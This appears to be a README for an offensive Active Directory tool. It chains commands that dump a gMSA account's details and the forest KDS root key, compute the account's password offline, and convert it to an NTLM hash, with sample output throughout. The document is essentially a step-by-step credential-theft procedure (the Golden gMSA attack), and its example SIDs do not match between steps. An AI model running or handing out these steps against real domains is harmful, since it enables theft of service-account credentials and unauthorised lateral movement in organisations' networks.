# GoldenGMSAPwdHash
Calculate Password hash from the extracted GMSA Base64 Password String.

**Obtain GMSA Account Information**

```bash
GoldenGMSA.exe gmsainfo -d us.techcorp.local

sAMAccountName:         jumpone$
objectSid:                      S-1-5-21-210670787-2521448726-163245708-8601
rootKeyGuid:            03239602-ab96-d31f-3fe6-24ea819a66f6
msds-ManagedPasswordID: AQAAAEtEU0sCAAAAaAEAAAgAAAAJAAAAApYjA5arH9[..snip..]
```

**Extract the KDS Root Key**

```bash
GoldenGMSA.exe kdsinfo --forest us.techcorp.local

Guid:           03239602-ab96-d31f-3fe6-24ea819a66f6
Base64 blob:    AQAAAAKWIwOWqx/TP+Yk6oGaZvYAAAAAAQAAAAA[..snip..]
```

**Calculate Pasword Offline**

```bash
GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey BASE64_BLOB_DATA --pwdid MSDS-MANAGEDPASSWORDID

Base64 Encoded Password:        ZSWQIz5mLbEcw6mm8J49DWCADxDT703UPFLbRftDTqE7WzAf[..snip..]
```

**Calculage NT HASH**

```bash
python3 goldengmsapwdhash.py --password XyQLsufa2UdpxPeVN0Gj6Zv7nCTvb92[..snip..]
 
NTLM Hash: a2*******************************80
```
